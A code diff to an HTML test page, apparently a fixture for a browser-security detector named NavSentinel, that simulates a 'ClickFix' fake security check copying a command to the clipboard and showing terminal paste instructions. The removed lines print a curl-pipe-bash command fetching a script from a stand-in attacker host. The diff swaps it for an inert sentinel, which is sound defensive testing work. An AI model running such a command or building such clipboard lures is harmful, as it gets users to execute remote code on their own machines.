@@ -107,8 +107,8 @@
   <h1>ClickFix 02 - Terminal Instructions Variant</h1>
   <div class="description">
     <strong>Attack scenario:</strong> A fake security check uses dark-themed UI to appear
-    legitimate. After clicking "Run Check", it writes a malicious command to clipboard and
-    shows terminal-style paste instructions.
+    legitimate. After clicking "Run Check", it writes a visibly inert synthetic sentinel to
+    the clipboard and shows terminal-style paste instructions.
     <br><br>
     <strong>Expected:</strong> NavSentinel detects clipboard write + overlay + paste instructions.
   </div>
@@ -139,10 +139,9 @@
     const statusEl = document.getElementById("status");
 
     runCheckBtn.addEventListener("click", function() {
-      // Simulated malicious command - uses curl + bash pattern
-      const fakeCommand = "curl -sL https://evil.example/check.sh | bash";
+      const syntheticClipboardValue = "NAVSENTINEL_SENTINEL_DO_NOT_RUN";
 
-      navigator.clipboard.writeText(fakeCommand).then(function() {
+      navigator.clipboard.writeText(syntheticClipboardValue).then(function() {
         terminalSteps.style.display = "block";
         runCheckBtn.textContent = "Verification Code Copied!";
         runCheckBtn.style.background = "#2ecc71";
